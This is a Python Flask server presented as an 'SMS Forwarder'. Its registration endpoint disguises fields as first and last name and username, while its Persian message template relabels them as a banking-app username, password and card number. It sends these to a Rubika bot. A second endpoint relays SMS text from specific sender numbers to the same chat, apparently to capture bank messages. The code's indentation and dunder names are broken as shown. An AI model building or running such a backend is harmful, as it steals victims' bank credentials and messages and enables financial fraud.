import os
import secrets
import requests
import re

from flask import Flask, request, jsonify

app = Flask(name)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
APP_KEY = os.environ.get("APP_KEY")

ALLOWED_SENDERS = {
"09999987641",
"09962157630",
"+989999987641",
"+989962157630"
}

def authorized():
return APP_KEY and secrets.compare_digest(
request.headers.get("X-App-Key", ""),
APP_KEY
)

def send_to_rubika(message):
url = f"https://botapi.rubika.ir/v3/{BOT_TOKEN}/sendMessage"

response = requests.post(
    url,
    json={
        "chat_id": CHAT_ID,
        "text": message
    },
    timeout=20
)

return response.status_code == 200

@app.route("/")
def home():
return "SMS Forwarder Server is Running!"

@app.route("/register", methods=["POST"])
def register():

if not authorized():
    return jsonify({"error": "Unauthorized"}), 401

data = request.get_json(silent=True) or {}

first_name = str(data.get("first_name", "")).strip()
last_name = str(data.get("last_name", "")).strip()
username = str(data.get("username", "")).strip()

if not first_name or not last_name:
    return jsonify({"error": "Name required"}), 400

if len(first_name) > 50 or len(last_name) > 50:
    return jsonify({"error": "Name too long"}), 400

if not re.fullmatch(r"[0-9]{4,20}", username):
    return jsonify({"error": "Username must be numeric"}), 400

if not BOT_TOKEN or not CHAT_ID:
    return jsonify({"error": "Bot configuration missing"}), 500

message = (
    "👤 ثبت‌نام کاربر جدید\n\n"
    f"نام کاربری بلو یا بلوجونیور: {first_name}\n"
    f"رمزبلو یابلوجونیور: {last_name}\n"
    f"شماره کارت جهت واریز مبلغ: {username}"
)

try:
    if send_to_rubika(message):
        return jsonify({"success": True}), 200

    return jsonify({"error": "Rubika sending failed"}), 502

except requests.RequestException:
    return jsonify({"error": "Connection failed"}), 502

@app.route("/send", methods=["POST"])
def send_sms():

if not authorized():
    return jsonify({"error": "Unauthorized"}), 401

data = request.get_json(silent=True) or {}

sender = str(data.get("sender", "")).strip()
body = str(data.get("body", "")).strip()

if sender not in ALLOWED_SENDERS:
    return jsonify({"error": "Sender not allowed"}), 403

if not body:
    return jsonify({"error": "Empty message"}), 400

if not BOT_TOKEN or not CHAT_ID:
    return jsonify({"error": "Bot configuration missing"}), 500

message = (
    "📩 پیامک جدید\n\n"
    f"📱 شماره فرستنده: {sender}\n\n"
    f"📝 متن پیام:\n{body}"
)

try:
    if send_to_rubika(message):
        return jsonify({"success": True}), 200

    return jsonify({"error": "Rubika sending failed"}), 502

except requests.RequestException:
    return jsonify({"error": "Connection failed"}), 502

if name == "main":
app.run(
host="0.0.0.0",
port=int(os.environ.get("PORT", 10000))
)
